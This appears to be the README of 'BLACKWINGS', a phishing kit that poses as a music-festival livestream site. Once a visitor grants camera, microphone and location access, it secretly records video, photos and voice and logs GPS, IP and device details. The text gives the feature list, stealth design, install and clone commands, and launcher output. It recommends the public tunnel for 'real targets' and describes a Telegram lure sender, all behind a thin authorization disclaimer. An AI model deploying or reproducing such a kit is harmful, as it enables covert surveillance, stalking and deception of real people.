# 🦅 BLACKWINGS — Camera, Voice & Location Phishing Kit

**Author:** Junmo  
**Version:** v2.0  
**Platforms:** Kali Linux · Debian · Ubuntu · Arch Linux · BlackArch Linux · Termux (Android)  
**Theme:** Fake music festival live-stream site — "BLACKWINGS Festival 2026"

> ⚠️ **AUTHORIZED USE ONLY**  
> This is a phishing simulation / Blackwings Junmo. Use it exclusively on systems and
> persons you own, or for which you hold explicit written authorization to test.
> The operator is fully responsible for compliance with all applicable laws.

---

## 📋 Table of Contents

1. [Features](#-features)
2. [File structure](#-file-structure)
3. [How it works (victim flow)](#-how-it-works-victim-flow)
4. [Installation](#-installation)
5. [Usage](#-usage)
6. [Results](#-results)
7. [Live location map](#-live-location-map)
8. [Expected output](#-expected-output)
9. [Hardening notes](#-hardening-notes)
10. [Troubleshooting](#-troubleshooting)
11. [Legal disclaimer](#-legal-disclaimer)

---

## 🚀 Features

| Feature | Detail |
|---|---|
| **Triple permission gate** | **Camera + Microphone + Location must ALL be allowed.** Deny any one → "Access Required" screen → **zero data captured** |
| **Hidden capture** | The camera feed is **never shown**. The `<video>` element is parked off-screen at 4×4px / 0.001 opacity — recording happens "like nothing is happening" |
| **Front camera** | **1 minute of video WITH the victim's voice embedded** + 60 photos (one every 1s) |
| **Back camera** | **1 minute of video WITH the victim's voice embedded** + 60 photos (auto-switch) |
| **Separate voice file** | A standalone **2-minute voice-only recording** (`voice_*.webm` / `.m4a`) captured silently in parallel — the mic also lives inside both videos |
| **Totals** | **120 photos + 2× 1-min videos (with voice) + 2-min separate voice** per victim |
| **Stealth UI** | While everything records, the victim only sees **"● VERIFYING PLEASE WAIT"** + progress bar + morse code **`-.. --- -. .---- - / - .-. -.-- / -- .`** ("DON'T TRY ME") — no camera, mic, REC, or timer text |
| **Location** | GPS saved + **live Google Maps viewer** at `/map` (auto-refresh every 3s) |
| **Metadata** | Victim IP + User-Agent + timestamp + file inventory stored per session in `info.json` |
| **Link delivery** | `send_link.py` prints a lure message or sends it via a Telegram bot |
| **Launcher** | `blackwings.sh` — red banner + menu, **auto-detects OS/package manager** (apt / pacman / pkg), auto-installs Flask + cloudflared |
| **Crash-proof pipeline** | Cloned mic track for the voice recorder, thread-safe `info.json` writes, every async step has timeouts + fallbacks — no hung screens, no zero-byte uploads |

---

## 📁 File structure

---

### What each file does

| File | Purpose |
|---|---|
| `app.py` | Serves the phishing page; receives video uploads (`/upload`), photo captures (`/capture`), GPS (`/location`); feeds the live map (`/location/latest`); serves the map page (`/map`). Saves everything under `captures/<session_id>/` |
| `templates/index.html` | The fake festival site. Requests **camera + location together**, enforces the both-or-nothing rule, records 30s front video + 10 photos, then 30s back video + 10 photos, then shows a fake e-ticket |
| `templates/map.html` | Your live tracking dashboard — Google Map pinned on the victim's GPS, refreshing every 3 seconds |
| `blackwings.sh` | One-shot launcher. Red banner, platform detection, dependency auto-install, menu: `1` localhost / `2` LAN IP / `3` public HTTPS tunnel / `0` exit |
| `send_link.py` | Generates the social-engineering lure message with the tunnel URL; optional Telegram auto-send |

---

## Option	Mode	URL	Use for

1	Localhost	http://127.0.0.1:5000	Testing on your own machine
2	LAN IP	http://<your-ip>:5000	Phone on same Wi-Fi — ⚠️ camera/GPS blocked on plain http, testing only
3	Public HTTPS tunnel	https://xxxx.trycloudflare.com	Real targets — use this one
0	Exit	—	Stop

---

## Verifying access…

         ● VERIFYING PLEASE WAIT
         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░  45%

        -.. --- -. .---- - / - .-. -.-- / -- .

---

 ## 🔧 Troubleshooting

Problem	Likely cause	Fix
[!] Server failed to start	Port 5000 already in use	kill $(lsof -t -i:5000) or change BW_PORT in blackwings.sh
cloudflared not found	Not in repo / not installed	The script auto-installs it. Manual: sudo apt install cloudflared · sudo pacman -S cloudflared · pkg install cloudflared, or download the binary from GitHub releases
LAN IP shows 127.0.0.1	Missing network tools (Termux)	pkg install net-tools, re-run. Otherwise use option 3
Camera prompt never appears	Target opened http:// instead of https://	Always send the https:// trycloudflare URL — camera/GPS APIs are blocked on insecure origins
No GPS pin on map	Victim denied location / desktop without GPS	Check captures/<session_id>/info.json for the location block
captures/ empty	Victim denied one of the two permissions	By design — the page refuses to work unless both are allowed
Video won't play	Wrong player/codec	Play .webm with VLC or MPV; Safari/iPhones produce .mp4
pip externally-managed error (Debian 12+)	PEP 668 restriction	Use pip3 install --break-system-packages flask (script does this automatically)
Tunnel dies after Ctrl+C	cloudflared stopped	Keep blackwings.sh running for the whole engagement

---

## 🛡 Hardening notes (v2.0)

Guarantee	How
No hung VERIFYING screen	Every promise resolves, times out, or is caught; recorder onerror triggers graceful finish
No zero-byte/race uploads	rec.onstop/onerror assigned before stop(); idempotent finish() guard
Mic works in all recorders	Voice recorder uses track.clone() — independent from the video recorders (Firefox/Chrome safe)
No black photos	Snapshot loop retries until readyState >= 2 and real dimensions exist
No corrupted info.json	INFO_LOCK serializes all read-modify-write on the server
No 500s on bad input	Safe int() parsing, missing-field checks, per-request session validation
Camera failure mid-flow	Falls back (desktop: front cam second minute) or waits out the timer — flow never dies

---

**Behind the scenes:** every 3 seconds during each 30s segment, a photo is captured and silently uploaded. The two videos are uploaded at the end of each segment. GPS + IP + User-Agent are written to `info.json`.

---

## 💻 Installation

### 1. Kali Linux / Debian / Ubuntu

```bash
sudo apt-get update
sudo apt-get install -y python3 python3-pip cloudflared
pip3 install flask --break-system-packages     # or: sudo apt install python3-flask
### Arch / BlackArch
sudo pacman -S --noconfirm --needed python python-pip cloudflared
pip install --break-system-packages flask
 
### Termux (Android)
pkg update && pkg upgrade
pkg install -y python cloudflared
pip install flask

### yezzzsirrr!!
sudo apt-get update
sudo apt-get upgrade -y
git clone https://github.com/sarahjalil/blackwings.git
cd blackwings
chmod +x blackwings.sh send_link.py
./blackwings.sh

---

## 📺 Expected output

# Launcher (Kali / Debian / Ubuntu — option 3)

kali@blackwings:~/blackwings$ ./blackwings.sh

   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗    ██╗██╗███╗   ██╗ ██████╗ ███████╗
   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║    ██║██║████╗  ██║██╔════╝ ██╔════╝
   ██████╔╝██║     ███████║██║     █████╔╝ ██║ █╗ ██║██║██╔██╗ ██║██║  ███╗███████╗
   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║███╗██║██║██║╚██╗██║██║   ██║╚════██║
   ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚███╔███╔╝██║██║ ╚████║╚██████╔╝███████║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
   ┌────────────────────────────────────────────────────┐
   │   BLACKWINGS — Camera & Location Phishing Kit      │
   │   Author   : Junmo                                 │
   │   Support  : Kali · Debian · Ubuntu · Arch ·       │
   │              BlackArch · Termux                    │
   └────────────────────────────────────────────────────┘
[+] Platform detected: debian

   ┌────────────────────────────────────────────────────┐
   │  [1] Localhost      → http://127.0.0.1:5000        │
   │  [2] LAN IP         → http://<your-ip>:5000        │
   │  [3] Public Tunnel  → cloudflared HTTPS link       │
   │  [0] Exit                                          │
   └────────────────────────────────────────────────────┘

   Choose an option: 3

[*] Starting BLACKWINGS server on http://127.0.0.1:5000 ...
[*] BLACKWINGS server on http://127.0.0.1:5000
 * Serving Flask app 'app'
 * Running on http://127.0.0.1:5000
[+] Server is UP (PID 5123)
[+] Live Google Map: http://127.0.0.1:5000/map
[*] Starting cloudflared — copy the https://xxxx.trycloudflare.com URL

2026-08-07T16:02:41Z INF +--------------------------------------------------------------------------------------------+
2026-08-07T16:02:41Z INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
2026-08-07T16:02:41Z INF |  https://black-falcon-runs-77qw.trycloudflare.com                                          |
2026-08-07T16:02:41Z INF +--------------------------------------------------------------------------------------------+

